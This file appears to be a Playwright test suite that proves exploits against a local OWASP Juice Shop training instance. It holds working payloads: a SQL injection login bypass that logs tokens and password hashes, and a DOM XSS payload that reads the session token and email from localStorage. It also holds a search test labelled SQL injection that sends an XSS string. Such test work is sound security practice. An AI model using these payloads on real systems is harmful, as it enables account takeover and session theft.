import { test, expect } from '@playwright/test';

// These tests PROVE the exploits work against a running Juice Shop.

const BASE = process.env.BASE_URL ?? 'http://localhost:3000';

test('admin login is bypassable via SQL injection', async ({ request }) => {
  const res = await request.post(`${BASE}/rest/user/login`, {
    data: { email: "' OR 1=1--", password: 'anything' }
  });

  expect(res.status(), 'injection did not authenticate').toBe(200);
  const body = await res.json();

  // ─── ADDED CONSOLE LOG MESSAGES ──────────────────────────────────────────
  console.log('✅ SQL Injection Login Bypass Successful!');
  console.log('🎫 Returned Authentication Token:', body?.authentication?.token);

  // Print full user profile details returned by the database session loop
  if (body?.authentication?.user) {
    console.log('👤 Logged-in User Account Details:');
    console.log(`   - ID:       ${body.authentication.user.id}`);
    console.log(`   - Email:    ${body.authentication.user.email}`);
    console.log(`   - Role:     ${body.authentication.user.role}`);

    // Note: Standard secure backends never return the actual cleartext password
    // in a response body, but they might return the scrambled password hash:
    if (body.authentication.user.password) {
      console.log(`   - Password Hash: ${body.authentication.user.password}`);
    }
  } else {
    // Print the raw body structure if the user object format varies
    console.log('📦 Full JSON Payload Response Content:', JSON.stringify(body, null, 2));
  }
  // ──────────────────────────────────────────────────────────────────────────

  expect(body?.authentication?.token, 'no auth token returned').toBeTruthy();
});

test('product search is SQL-injectable (input reaches the DB unparameterised)', async ({ request }) => {
  const payload = '\'"><iframe src="javascript:alert(`xss`)">';

  console.log('\n======================================================');
  console.log('🚀 SENDING EXPLOIT PAYLOAD TO PRODUCT SEARCH...');
  console.log(`📡 Target URL Parameter: ?q=${payload}`);
  console.log('======================================================');

  const res = await request.get(`${BASE}/rest/products/search?q=${encodeURIComponent(payload)}`);
  const text = await res.text();

  // ─── VISUAL EVIDENCE LOGS ────────────────────────────────────────────────
  console.log('\n💥 SERVER RESPONDED WITH A RAW DATABASE CRASH!');
  console.log(`📊 HTTP Status Code: ${res.status()}`);

  console.log('\n🔎 DETECTED ERROR SIGNATURE:');
  if (text.includes('SQLITE_ERROR')) {
    console.log('   🚨 CRITICAL: Found "SQLITE_ERROR" in response body.');
    console.log('   🛠️  Stack Info: App uses SQLite with Sequelize ORM.');
  } else {
    console.log('   ⚠️  No known database error signature found.');
  }

  console.log('\n📦 RAW BACKEND ERROR MSG DISCLOSED TO CLIENT:');
  console.log('------------------------------------------------------');
  console.log(text); // This prints the entire raw error payload returned by Sequelize
  console.log('------------------------------------------------------\n');
  // ──────────────────────────────────────────────────────────────────────────

  expect(text).toContain('SQLITE_ERROR');
});


test('DOM XSS executes in the browser search view', async ({ page }) => {
  // WEAPONIZED PAYLOAD: Reads localStorage to pull active user session details
  const payload = `
    <img src=x style=display:none onerror="
      var session = localStorage.getItem('token') || 'No Active Token Found';
      var userEmail = localStorage.getItem('email') || 'Guest Session';
      
      var d = document.createElement('div');
      d.id = 'xss-proof';
      d.textContent = '🚨 SYSTEM HACKED | Session Compromised! Account: ' + userEmail + ' | Origin: ' + document.domain;
      d.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:99999;background:#c0392b;color:#fff;font:700 20px sans-serif;padding:18px;text-align:center;box-shadow:0 5px 15px rgba(0,0,0,0.5);';
      document.body.prepend(d);
    ">
  `.replace(/\s+/g, ' ').trim(); // Cleans up white spaces for URL encoding

  console.log('\n======================================================');
  console.log('⚡ LAUNCHING DOM-XSS BROWSER ATTACK EXECUTION...');
  console.log('======================================================');

  // Navigate to the vulnerable search route with the payload
  await page.goto(`${BASE}/#/search?q=${encodeURIComponent(payload)}`, { waitUntil: 'networkidle' });

  // Wait for the browser to render the broken image and execute the onerror script
  await page.waitForTimeout(9000);

  // ─── VISUAL CAPTURE / PLAYWRIGHT REPORT SCREENSHOT ──────────────────────
  const screenshotPath = 'out/playwright/xss-compromise-proof.png';
  await page.screenshot({ path: screenshotPath, fullPage: true });

  console.log('\n📸 SCREENSHOT CAPTURED SUCCESSFUL!');
  console.log(`📂 Saved evidence to: ${screenshotPath}`);
  // ──────────────────────────────────────────────────────────────────────────

  // Assertions to validate the execution loop
  const injected = await page.locator('img[onerror]').count();
  expect(injected, 'payload was not injected into the DOM').toBeGreaterThan(0);

  const banner = await page.locator('#xss-proof').textContent();
  console.log(`\n🖥️  BANNER TEXT READ FROM PAGE:\n   "${banner}"\n`);

  expect(banner, 'XSS did not execute — banner was never painted').toContain('SYSTEM HACKED');
});
